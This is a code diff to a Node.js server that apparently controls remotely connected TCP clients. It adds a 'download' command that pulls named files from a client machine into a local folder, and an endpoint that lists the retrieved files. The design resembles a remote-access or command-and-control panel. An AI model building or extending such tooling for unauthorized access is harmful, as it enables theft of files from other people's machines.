@@ -162,9 +162,52 @@ function createTcpServer() {
   
   // Buffer for incomplete messages
   let messageBuffer = '';
+  let isDownloading = false;
+  let downloadBuffer = Buffer.alloc(0);
+  let downloadFilename = '';
+  let downloadTimeout = null;
   
   socket.on('data', (data) => {
     try {
+      // Check if we're in download mode (receiving binary data)
+      if (isDownloading) {
+        downloadBuffer = Buffer.concat([downloadBuffer, data]);
+        
+        // Reset timeout when receiving data
+        if (downloadTimeout) {
+          clearTimeout(downloadTimeout);
+        }
+        
+        // Set timeout to complete download after 2 seconds of inactivity
+        downloadTimeout = setTimeout(() => {
+          if (isDownloading && downloadBuffer.length > 0 && downloadFilename) {
+            try {
+              const filename = path.basename(downloadFilename);
+              const downloadPath = path.join('downloads', filename);
+              fs.writeFileSync(downloadPath, downloadBuffer);
+              console.log(`[TCP] File downloaded: ${downloadPath} (${downloadBuffer.length} bytes)`);
+              
+              // Notify GUI clients about successful download
+              io.emit('fileDownloaded', {
+                clientId: clientId,
+                filename: filename,
+                path: downloadPath,
+                size: downloadBuffer.length
+              });
+              
+              // Reset download state
+              isDownloading = false;
+              downloadBuffer = Buffer.alloc(0);
+              downloadFilename = '';
+            } catch (error) {
+              console.error(`[TCP] Error saving downloaded file:`, error);
+            }
+          }
+        }, 2000);
+        
+        return;
+      }
+      
       // Add new data to buffer
       messageBuffer += data.toString();
       
@@ -234,6 +277,14 @@ function createTcpServer() {
         if (client) {
           client.lastSeen = new Date();
           
+          // Check if this is a download command response
+          if (message.content && message.content.includes('Download') && message.content.includes('Failed')) {
+            // Download failed, reset download state
+            isDownloading = false;
+            downloadBuffer = Buffer.alloc(0);
+            downloadFilename = '';
+          }
+          
           // Store in session history
           const session = clientSessions.get(clientId) || [];
           session.push({
@@ -250,6 +301,12 @@ function createTcpServer() {
             timestamp: new Date()
           });
         }
+      } else if (message.type === 'command' && message.content && message.content.startsWith('download ')) {
+        // Download command received - prepare for file download
+        downloadFilename = message.content.replace('download ', '');
+        isDownloading = true;
+        downloadBuffer = Buffer.alloc(0);
+        console.log(`[TCP] Starting download: ${downloadFilename}`);
       } else if (message.type === 'heartbeat') {
         // Heartbeat response
         const client = clients.get(clientId);
@@ -269,6 +326,32 @@ function createTcpServer() {
   
   socket.on('close', () => {
     console.log(`[TCP] Client disconnected: ${clientIP}`);
+    
+    // Clear download timeout
+    if (downloadTimeout) {
+      clearTimeout(downloadTimeout);
+    }
+    
+    // Save downloaded file if we were downloading
+    if (isDownloading && downloadBuffer.length > 0 && downloadFilename) {
+      try {
+        const filename = path.basename(downloadFilename);
+        const downloadPath = path.join('downloads', filename);
+        fs.writeFileSync(downloadPath, downloadBuffer);
+        console.log(`[TCP] File downloaded: ${downloadPath} (${downloadBuffer.length} bytes)`);
+        
+        // Notify GUI clients about successful download
+        io.emit('fileDownloaded', {
+          clientId: clientId,
+          filename: filename,
+          path: downloadPath,
+          size: downloadBuffer.length
+        });
+      } catch (error) {
+        console.error(`[TCP] Error saving downloaded file:`, error);
+      }
+    }
+    
     const client = clients.get(clientId);
     if (client) {
       client.active = false;
@@ -629,6 +712,30 @@ app.post('/api/upload', upload.single('file'), (req, res) => {
     originalName: req.file.originalname,
     path: req.file.path
   });
+});
+
+app.get('/api/downloads', (req, res) => {
+  try {
+    const downloadsDir = 'downloads';
+    if (!fs.existsSync(downloadsDir)) {
+      return res.json([]);
+    }
+    
+    const files = fs.readdirSync(downloadsDir).map(filename => {
+      const filePath = path.join(downloadsDir, filename);
+      const stats = fs.statSync(filePath);
+      return {
+        filename,
+        size: stats.size,
+        modified: stats.mtime,
+        path: filePath
+      };
+    });
+    
+    res.json(files);
+  } catch (error) {
+    res.status(500).json({ error: 'Failed to list downloads' });
+  }
 });
 
 app.get('/api/downloads/:filename', (req, res) => {
